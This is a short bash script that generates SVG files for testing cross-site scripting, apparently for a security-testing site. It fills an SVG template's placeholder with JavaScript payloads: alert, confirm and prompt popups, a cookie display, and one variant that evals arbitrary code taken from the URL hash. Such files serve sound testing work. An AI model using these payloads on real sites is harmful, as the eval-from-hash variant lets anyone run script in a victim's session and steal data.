#!/usr/bin/env bash
# Run this after updating/changing the site/images/xss-template.svg file to generate the variants of it

# Switch to the directory of this file
cd "$( dirname "${BASH_SOURCE[0]}" )"

# Paths are easier if we are in the image directory
cd site/images/

# Alert boxes may be prohibited, so we try to log it to the console first
sed 's/JS_PAYLOAD/console.error(msg)/' xss-template.svg > xss-console.svg
sed 's/JS_PAYLOAD/console.error(msg);alert(msg)/' xss-template.svg > xss-console-alert.svg
sed 's/JS_PAYLOAD/console.error(msg);confirm(msg)/' xss-template.svg > xss-console-confirm.svg
sed 's/JS_PAYLOAD/console.error(msg);prompt(msg)/' xss-template.svg > xss-console-prompt.svg
sed 's/JS_PAYLOAD/console.error(msg);alert(document.cookie)/' xss-template.svg > xss-console-alert_cookies.svg
sed 's/JS_PAYLOAD/console.error(msg);alert(location.href)/' xss-template.svg > xss-console-alert_location_url.svg
sed 's/JS_PAYLOAD/console.error(msg);code=decodeURIComponent(location.hash.slice(1));console.error(31337,code);eval(code)/' xss-template.svg > xss-console-eval_hash.svg
